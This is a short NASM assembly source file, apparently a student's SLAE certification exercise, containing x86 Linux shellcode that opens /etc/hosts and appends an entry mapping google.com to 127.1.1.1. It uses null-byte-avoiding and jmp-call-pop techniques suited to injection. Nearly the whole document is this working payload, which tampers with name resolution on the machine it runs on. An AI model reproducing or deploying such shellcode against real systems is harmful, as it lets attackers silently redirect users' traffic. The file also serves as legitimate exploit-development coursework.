;Filename: host_mod.nasm
;Author: Jonathan So
;Student ID: SLAE-1470
;SLAE-Exercise 6

global _start

section .text

_start:
	xor ecx, ecx
	mul ecx
	mov al, 0x5
	push ecx
	;push 0x7374736f	;/etc///hosts
	;push 0x682f2f2f
	;push 0x6374652f
	jmp short _load_name	;We will use another jmp call pop to replace it instead

_open:
	;mov ebx, esp
	pop ebx	
	mov cx, 0x401		;permmisions
	int 0x80		;syscall to open file

	xchg eax, ebx
	push 0x4
	pop eax
	jmp short _load_data	;jmp-call-pop technique to load the map

_write:
	pop ecx
	;push 20		;length of the string, dont forget to modify if changes the map
	;pop edx
	mov dl, 20		;edx remain 0x0 at this point
	int 0x80		;syscall to write in the file

	push 0x6
	pop eax
	int 0x80		;syscall to close the file

	push 0x1
	pop eax
	int 0x80		;syscall to exit

_load_data:
	call _write
	google db "127.1.1.1 google.com"

_load_name:			;Original named _load_file, which cause the objdump bash strip away the opcode
	call _open
	hosts db "/etc/hosts"
